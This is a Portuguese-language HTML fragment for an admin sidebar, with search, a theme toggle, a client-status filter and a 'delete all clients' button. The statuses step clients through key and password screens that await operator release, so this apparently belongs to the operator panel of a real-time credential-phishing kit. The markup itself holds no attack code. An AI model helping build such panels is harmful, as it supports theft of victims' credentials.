<div class="offcanvas offcanvas-start" tabindex="-1" id="offcanvasSidebar">
  <div class="offcanvas-header">
    <h5 class="offcanvas-title">Ferramentas Admin</h5>
    <button type="button" class="btn-close" data-bs-dismiss="offcanvas"></button>
  </div>
  <div class="offcanvas-body">
    <div class="form-check form-switch">
      <input class="form-check-input" type="checkbox" id="themeToggleMobile">
      <label class="form-check-label" for="themeToggleMobile">Modo Claro</label>
    </div>
    <input type="text" id="searchInputMobile" class="form-control mb-2" placeholder="🔍 Buscar por nome...">
    <select id="filterStatusMobile" class="form-select">
      <option value="">Todos os Status</option>
      <option value="guest">🏠 Na Home</option>
      <option value="chat">💬 No Chat</option>
      <option value="pending">🕒 Aguardando liberação</option>
      <option value="authorized">📲 Na tela de chave</option>
      <option value="aguardando_key">🔑 Chave informada</option>
      <option value="key_authorized">🔒 Na tela de senha</option>
      <option value="aguardando_password">⌛ Aguardando liberação final</option>
      <option value="password_authorized">✅ Finalizado</option>
      <option value="rejected">❌ Rejeitado</option>
    </select>
    <hr style="border-color:var(--border);">
    <form method="post" action="delete_all_clients.php"
          onsubmit="return confirm('TEM CERTEZA? Esta ação é irreversível e irá apagar TODOS os clientes.');">
      <button type="submit" class="btn-excluir-todos">Excluir Todos os Clientes</button>
    </form>
  </div>
</div>